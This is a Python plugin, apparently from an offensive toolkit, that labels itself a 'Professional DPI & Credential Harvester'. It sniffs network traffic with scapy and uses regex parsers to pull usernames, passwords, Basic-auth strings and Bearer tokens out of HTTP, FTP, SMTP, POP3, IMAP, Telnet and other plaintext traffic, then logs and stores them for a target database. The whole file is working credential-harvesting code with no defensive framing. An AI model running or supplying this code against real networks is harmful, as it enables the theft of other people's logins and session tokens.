from core.plugin_manager import BasePlugin
from scapy.all import AsyncSniffer, IP, TCP, UDP, Raw
import base64
import re
import base64
from datetime import datetime


class SnifferPlugin(BasePlugin):
    def __init__(self):
        self.sniffer = None
        self.credentials: list = []
        self.dns_log: list = []
        self.packet_count: int = 0

    @property
    def name(self) -> str:
        return "Sniffer"

    @property
    def description(self) -> str:
        return "Professional DPI & Credential Harvester"

    async def start(self, iface: str = None):
        kwargs = {"prn": self._process_packet, "store": False}
        if iface:
            kwargs["iface"] = iface
        self.sniffer = AsyncSniffer(**kwargs)
        self.sniffer.start()
        print(f"Sniffer: DPI active on {iface or 'default interface'}.")

    async def stop(self):
        if self.sniffer:
            self.sniffer.stop()
            self.emit("INFO", {"msg": f"Sniffer stopped. Captured {len(self.credentials)} credentials, {self.packet_count} packets"})

    def get_dns_log(self):
        """Return captured DNS query log (most recent last)."""
        return list(self.dns_log)

    # ------------------------------------------------------------------
    # Packet router
    # ------------------------------------------------------------------

    def _process_packet(self, pkt):
        if IP not in pkt:
            return

        summary = {
            "src":   pkt[IP].src,
            "dst":   pkt[IP].dst,
            "proto": pkt[IP].proto,
            "len":   len(pkt),
            "type":  "PKT",
        }

        if Raw not in pkt:
            self.emit("PACKET", summary)
            return

        payload = pkt[Raw].load.decode("utf-8", errors="ignore")

        # Route to protocol parser by destination port
        dport = pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else 0)
        sport = pkt[TCP].sport if TCP in pkt else (pkt[UDP].sport if UDP in pkt else 0)
        port  = dport or sport

        creds = []
        if port in (80, 8080, 8000, 8443):
            creds = self._parse_http(payload)
        elif port == 21 or sport == 21:
            creds = self._parse_ftp(payload)
        elif port == 25 or port == 587 or port == 465:
            creds = self._parse_smtp(payload)
        elif port == 110:
            creds = self._parse_pop3(payload)
        elif port == 143:
            creds = self._parse_imap(payload)
        elif port == 23:
            creds = self._parse_telnet(payload)
        else:
            # Generic form-post / Authorization header scan on all other ports
            creds = self._parse_generic(payload)

        for cred in creds:
            summary["type"] = "AUTH"
            summary["data"] = cred
            self.credentials.append(cred)
            print(f"[*] Sniffer: Credential captured: {cred}")
            self.emit("CREDENTIAL_FOUND", {"cred": cred, "src": pkt[IP].src, "dst": pkt[IP].dst})
            if self.target_store:
                self.target_store.save_credential("Sniffer", cred)

        self.emit("PACKET", summary)

    # ------------------------------------------------------------------
    # Protocol parsers
    # ------------------------------------------------------------------

    def _parse_http(self, payload: str) -> list:
        creds = []

        # HTTP Basic Auth
        for m in re.finditer(r"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", payload, re.IGNORECASE):
            try:
                decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                creds.append(f"HTTP-Basic:{decoded}")
            except Exception:
                pass

        # Form POST fields
        for m in re.finditer(
            r"(?i)(?:user(?:name)?|login|email|usr)\s*=\s*([^&\r\n]+).*?"
            r"(?:pass(?:word)?|pwd)\s*=\s*([^&\r\n]+)",
            payload, re.DOTALL
        ):
            creds.append(f"HTTP-Form:{m.group(1).strip()}:{m.group(2).strip()}")

        # Bearer token
        for m in re.finditer(r"Authorization:\s*Bearer\s+([A-Za-z0-9._\-]+)", payload, re.IGNORECASE):
            creds.append(f"HTTP-Bearer:{m.group(1)[:80]}")

        return creds

    def _parse_ftp(self, payload: str) -> list:
        creds = []
        for m in re.finditer(r"^USER\s+([^\r\n]+)", payload, re.MULTILINE):
            creds.append(f"FTP-USER:{m.group(1).strip()}")
        for m in re.finditer(r"^PASS\s+([^\r\n]+)", payload, re.MULTILINE):
            creds.append(f"FTP-PASS:{m.group(1).strip()}")
        return creds

    def _parse_smtp(self, payload: str) -> list:
        creds = []
        # PLAIN/LOGIN AUTH
        for m in re.finditer(r"AUTH\s+(?:PLAIN|LOGIN)\s+([A-Za-z0-9+/=]+)", payload, re.IGNORECASE):
            try:
                decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                parts = [p for p in decoded.split("\x00") if p]
                creds.append(f"SMTP-AUTH:{':'.join(parts)}")
            except Exception:
                pass
        # Bare base64 credential lines (multi-step LOGIN exchange)
        for m in re.finditer(r"^([A-Za-z0-9+/]{12,}={0,2})\r?$", payload, re.MULTILINE):
            try:
                decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                if decoded.isprintable():
                    creds.append(f"SMTP-CRED:{decoded[:80]}")
            except Exception:
                pass
        return creds

    def _parse_pop3(self, payload: str) -> list:
        creds = []
        for m in re.finditer(r"^USER\s+([^\r\n]+)", payload, re.MULTILINE | re.IGNORECASE):
            creds.append(f"POP3-USER:{m.group(1).strip()}")
        for m in re.finditer(r"^PASS\s+([^\r\n]+)", payload, re.MULTILINE | re.IGNORECASE):
            creds.append(f"POP3-PASS:{m.group(1).strip()}")
        return creds

    def _parse_imap(self, payload: str) -> list:
        creds = []
        # IMAP LOGIN command: A001 LOGIN user pass
        for m in re.finditer(
            r"[A-Z0-9]+ LOGIN\s+\"?([^\" \r\n]+)\"?\s+\"?([^\" \r\n]+)\"?",
            payload, re.IGNORECASE
        ):
            creds.append(f"IMAP-LOGIN:{m.group(1)}:{m.group(2)}")
        # AUTHENTICATE PLAIN
        for m in re.finditer(r"AUTHENTICATE PLAIN\s+([A-Za-z0-9+/=]+)", payload, re.IGNORECASE):
            try:
                decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                parts = [p for p in decoded.split("\x00") if p]
                creds.append(f"IMAP-AUTH:{':'.join(parts)}")
            except Exception:
                pass
        return creds

    def _parse_telnet(self, payload: str) -> list:
        # Telnet sends credentials as plaintext lines
        creds = []
        for m in re.finditer(r"(?:login|username):\s*([^\r\n]+)", payload, re.IGNORECASE):
            creds.append(f"TELNET-USER:{m.group(1).strip()}")
        for m in re.finditer(r"(?:password|passwd):\s*([^\r\n]+)", payload, re.IGNORECASE):
            creds.append(f"TELNET-PASS:{m.group(1).strip()}")
        return creds

    def _parse_generic(self, payload: str) -> list:
        creds = []
        for m in re.finditer(
            r"(?i)(?:user(?:name)?|login|usr)\s*[:=]\s*([^&\s]{3,})",
            payload
        ):
            creds.append(f"GENERIC-USER:{m.group(1)[:60]}")
        for m in re.finditer(
            r"(?i)(?:pass(?:word)?|pwd|secret)\s*[:=]\s*([^&\s]{3,})",
            payload
        ):
            creds.append(f"GENERIC-PASS:{m.group(1)[:60]}")
        return creds
